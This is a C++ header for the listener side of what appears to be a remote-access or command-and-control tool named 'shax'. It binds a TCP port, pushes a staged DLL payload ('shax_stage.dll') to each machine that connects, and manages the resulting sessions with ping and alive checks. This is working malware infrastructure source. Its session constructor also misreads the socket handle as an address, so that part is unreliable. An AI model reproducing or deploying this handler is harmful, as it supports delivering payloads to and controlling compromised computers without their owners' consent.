#pragma once

#include "../shared/shax.hpp"
#include <thread>
#include <map>
#include <chrono>

#pragma comment(lib, "Ws2_32.lib")

struct session {
public:
    session( SOCKET socket ) {

        char ip_str[INET_ADDRSTRLEN];
        auto socket_addr = reinterpret_cast<SOCKADDR_IN*>(&socket);

        inet_ntop( AF_INET, &socket_addr->sin_addr, ip_str, INET_ADDRSTRLEN );
        strcpy_s( this->ip_str, INET_ADDRSTRLEN, ip_str);

        this->port   = socket_addr->sin_port;
        this->socket = socket;
    }

    char ip_str[INET_ADDRSTRLEN];
    int port;
    SOCKET socket;
};


class shax : public shax_base {
public:
    shax() : shax_base() 
    {

    }

    void alive() {

    }

    void died() {
        auto index = current_session_index();
        m_socks.erase( index );
        m_addrs.erase( index );

        utils::println( std::string( "Session died" ), msg_color::light_red, msg_type::error );
    }

    int ping() {

        using namespace std::chrono;

        auto start = high_resolution_clock::now();

        if ( snd_str( "ping" ) ) {

            auto data = rcv_str();

            if ( !data.second ) {
                return 0;
            }

            auto stop = high_resolution_clock::now();
            auto ping_ms = duration_cast<milliseconds>(stop - start).count();

            if ( data.first == std::string( "pong" ) ) {
                return ping_ms;
            }
        }

        return 0;
    }

    bool is_alive() {
        return snd_str( "alive" );
    }

    bool send_stage( std::string stage_name ) {

        auto zc = new zero_copy( stage_name );

        return zc->map() 
            && snd_arr( zc ) 
            && zc->unmap();
    }

    bool select_session( const int session_index ) {

        if ( session_index > m_socks.size() - 1 )
            return false;

        auto old_sock = m_sock;
        m_sock = m_socks[session_index];

        if ( is_alive() ) {
            m_addr = m_addrs[session_index];
            m_current_index = session_index;
            return true;
        }

        m_sock = old_sock;
        m_socks.erase( session_index );
        m_addrs.erase( session_index );

        return false;
    }

    int current_session_index( void ) {
        return m_current_index;
    }

    int new_session_index( void ) {
        auto index = 0;
        while ( m_socks.find( index ) != m_socks.end() ) {
            ++index;
        }
        return index;
    }

    bool start_listener( int port ) {

        m_addr.sin_family      = AF_INET;
        m_addr.sin_addr.s_addr = htonl( INADDR_ANY );
        m_addr.sin_port        = htons( port );
        m_sock = NULL;

        auto optval = 1;
        auto _socket = WSASocketW( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL );
        auto _addr_s = (int)sizeof( sockaddr_in );
        auto server_socket_addr = sockaddr_in{};
        setsockopt( _socket, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof( int ) );
        
        if ( SOCKET_FAILED( _socket )
             || SOCKET_FAILED( bind( _socket, reinterpret_cast<sockaddr*>(&m_addr), _addr_s ) )
             || SOCKET_FAILED( listen( _socket, 5 ) ) )
        {
            dispose();
            return false;
        }

        while ( m_sock = accept( _socket, reinterpret_cast<sockaddr*>(&server_socket_addr), &_addr_s ) ) {

            send_stage( "shax_stage.dll" );

            m_current_index = new_session_index();
            m_socks.insert( std::make_pair( m_current_index, m_sock ) );
            m_addrs.insert( std::make_pair( m_current_index, server_socket_addr ) );
            
            auto msg = std::string( "Shax session " 
                                    + std::to_string( m_current_index ) + " opened -> "
                                    + utils::ip_of( server_socket_addr ) + ":" 
                                    + std::to_string(server_socket_addr.sin_port) );
            utils::println( msg, msg_color::light_magenta, msg_type::success );
        }

        if ( SOCKET_FAILED( m_sock ) ) {
            dispose();
            return false;
        }

        return true;
    }

    int m_current_index;

    std::map<INT, SOCKADDR_IN> m_addrs;
    std::map<INT, SOCKET>      m_socks;
};